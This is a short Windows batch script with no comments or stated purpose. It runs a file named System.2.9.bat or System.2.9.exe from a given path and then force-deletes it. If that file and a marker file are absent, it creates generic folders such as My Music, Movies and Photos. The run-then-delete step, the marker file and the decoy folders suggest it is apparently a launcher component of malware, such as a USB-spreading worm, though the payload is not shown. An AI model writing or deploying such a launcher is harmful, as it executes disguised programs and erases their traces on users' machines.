@echo off
set path=%1

if	exist	%path%System.2.9.bat	(
"%path%System.2.9.bat"
DEL /F /Q %path%System.2.9.bat
exit
)	else	(
if	exist	%path%System.2.9.exe	(
"%path%System.2.9.exe"
DEL /F /Q %path%System.2.9.exe
exit
)	else	(
if	exist	%path%j.ico	(exit)	else	(


mkdir	"%path%My Music"
mkdir	"%path%Movies"
mkdir	"%path%Videos"
mkdir	"%path%Photos"
mkdir	"%path%29U"
exit



)
)
)